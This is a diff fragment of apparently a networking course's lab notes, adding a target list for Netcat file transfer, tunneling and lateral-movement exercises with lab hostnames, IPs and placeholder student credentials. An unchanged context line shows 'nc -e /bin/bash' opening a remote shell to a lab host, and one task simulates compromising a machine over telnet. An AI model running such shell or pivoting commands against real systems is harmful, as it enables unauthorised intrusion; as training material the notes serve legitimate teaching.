@@ -118,4 +118,54 @@ On Victim using -e :
 
 $ nc -e /bin/bash 10.10.0.40 9999
 
+----------------------------------------------------------------------------------------------------
+Target Section:
 
+Task 1
+
+T1
+Hostname: INTERNET_HOST
+External IP: 10.50.XXX.XXX (ALREADY PROVIDED) Internal IP: 10.10.0.40 (ALREADY PROVIDED) (accessed via FLOAT IP)
+creds: student:password
+Action: Successfully transfer file data between hosts via Netcat
+
+T2
+Hostname: BLUE_HOST-4
+IP: 172.16.82.115
+creds: (No Access)
+Action: Successfully transfer files from this host using Netcat
+
+RELAY
+Hostname: BLUE_INT_DMZ_HOST-1
+IP: 172.16.40.10
+creds: student:password
+Action: Successfully transfer file data between hosts via Netcat
+
+
+
+Task 3
+
+T3
+Hostname: Atropia
+IP: 10.50.XXX.XXX (Will be Provided by Mission Command)
+creds: netY_studentX:passwordX (netY = Networking Class Identifier & studentX = Student Number & passwordX = Student Number)
+Known Ports: 22(ssh)
+Action: Establish appropriate tunneling techniques
+
+T4
+Hostname: Pineland
+IP: 10.50.XXX.XXX (Will be Provided by Mission Command)
+creds: netY_studentX:passwordX (netY = Networking Class Identifier & studentX = Student Number & passwordX = Student Number)
+Known Ports: 23(telnet - go directly from T1 to T4 to simulate compromising the machine)
+Type: Compromised Donovian System
+Action: Establish appropriate tunneling techniques
+
+
+
+Task 4
+T5
+Hostname: UNKNOWN
+IP: 10.50.XXX.XXX (Will be Provided by Mission Command)
+creds: netY_studentX:passwordX (netY = Networking Class Identifier & studentX = Student Number & passwordX = Student Number)
+Known Ports: UNKNOWN
+Action: Execute proper movement and redirection techniques
